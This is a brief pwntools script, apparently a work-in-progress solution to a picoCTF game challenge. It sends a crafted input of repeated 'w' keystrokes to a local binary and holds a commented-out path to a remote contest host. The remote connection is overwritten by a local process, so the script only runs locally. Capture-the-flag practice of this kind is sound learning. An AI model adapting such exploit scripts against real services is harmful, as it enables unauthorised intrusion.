# -- coding: utf-8 --
from pwn import *

# context.log_level = 'debug'
# ENV
PORT =  50157
HOST = "saturn.picoctf.net"

# e = context.binary = ELF('./game')
e = context.binary = ELF('./game2')
if len(sys.argv) > 1 and sys.argv[1] == 'r':
    r = remote(HOST, PORT)

# for i in range(10000):
r = e.process()
# VARIABLE

# payload = b"a"*8+b"w"*4 + b"p"
payload = b"a"*(0)+b"w"*5
pause()
r.sendline(payload)
# PAYLOAD
# r.close()

r.interactive()